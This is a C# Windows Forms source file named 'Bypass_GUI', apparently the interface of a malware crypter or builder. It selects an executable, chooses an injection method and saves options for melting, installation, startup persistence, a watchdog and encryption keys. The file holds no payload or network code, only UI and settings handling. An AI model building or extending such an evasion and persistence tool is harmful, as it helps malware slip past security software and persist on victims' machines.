using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bypass_GUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void splitContainer1_Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            openFileDialog1.InitialDirectory = "C:\\";
            openFileDialog1.Filter = "Executable Program (*.exe)|*.exe|All files (*.*)|*.*";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.ShowDialog();
            textBox2.Text = openFileDialog1.FileName;

        }

        private void toolStripProgressBar1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            saveFileDialog1.ShowDialog();
            textBox3.Text = saveFileDialog1.FileName;
        }

        private void comboBox1_SelectedValueChanged(object sender, EventArgs e)
        {
            var selected = comboBox1.SelectedItem.ToString();
            if (selected == "Specify Injection")
            {
                textBox1.Visible = true;
            }
            else {
                textBox1.Visible = false;
                
            }
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.injAssembly = textBox1.Text;
            Properties.Settings.Default.melt = checkedListBox1.GetItemChecked(1);
            Properties.Settings.Default.install = checkedListBox1.GetItemChecked(2);
            Properties.Settings.Default.startup = checkedListBox1.GetItemChecked(3);
            Properties.Settings.Default.watchdog = checkedListBox1.GetItemChecked(4);
            Properties.Settings.Default.encrypt = checkedListBox1.GetItemChecked(5);
            Properties.Settings.Default.encryptionKey = textBox4.Text;
            Properties.Settings.Default.watchdogKey = textBox5.Text;
            Properties.Settings.Default.method = comboBox1.SelectedIndex;
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            textBox1.Text = Properties.Settings.Default.injAssembly;
            checkedListBox1.SetItemChecked(1, Properties.Settings.Default.melt);
            checkedListBox1.SetItemChecked(2, Properties.Settings.Default.install);
            checkedListBox1.SetItemChecked(3, Properties.Settings.Default.startup);
            checkedListBox1.SetItemChecked(4, Properties.Settings.Default.watchdog);
            checkedListBox1.SetItemChecked(5, Properties.Settings.Default.encrypt);
            textBox4.Text = Properties.Settings.Default.encryptionKey;
            textBox5.Text = Properties.Settings.Default.watchdogKey;
            comboBox1.SelectedIndex = Properties.Settings.Default.method;
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void checkedListBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

           
        }
    }
}
